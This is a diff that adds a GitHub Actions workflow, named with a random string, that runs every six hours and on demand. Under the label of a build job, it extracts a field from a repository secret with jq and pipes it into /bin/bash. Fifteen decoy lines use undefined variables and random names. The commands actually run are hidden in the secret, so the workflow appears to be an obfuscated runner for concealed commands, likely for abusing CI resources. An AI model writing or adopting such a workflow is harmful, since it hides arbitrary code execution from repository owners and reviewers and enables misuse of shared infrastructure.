@@ -1,0 +1,32 @@
+name: jiyunqian4189
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiyunqian4189
+        env:
+          wkkjk96115: ${{ secrets.wkkjk96115 }}
+        run: |
+          echo $wkkjk96115 | jq -r .bzzez0969 | /bin/bash
+          echo $uxoph37297 | jq -r .ztp5607 | /bin/bash
+          echo $b19250 | jq -r .ii7 | /bin/bash
+          echo $edev21928 | jq -r .lbh047 | /bin/bash
+          echo $tu0052 | jq -r .ysm3 | /bin/bash
+          echo $iw216 | jq -r .khqc23 | /bin/bash
+          echo $trtuq19 | jq -r .rgx0604 | /bin/bash
+          echo $ibzf42 | jq -r .gptaz597 | /bin/bash
+          echo $hugw2 | jq -r .cjrk37722 | /bin/bash
+          echo $gxirm09 | jq -r .dqym7 | /bin/bash
+          echo $gemoz48762 | jq -r .ihxvb13110 | /bin/bash
+          echo $pgks74470 | jq -r .zx3200 | /bin/bash
+          echo $nvgvl2685 | jq -r .hv62 | /bin/bash
+          echo $g49099 | jq -r .j2 | /bin/bash
+          echo $jh35 | jq -r .awnyi695 | /bin/bash
+          echo $mszs51 | jq -r .khxe69 | /bin/bash
+
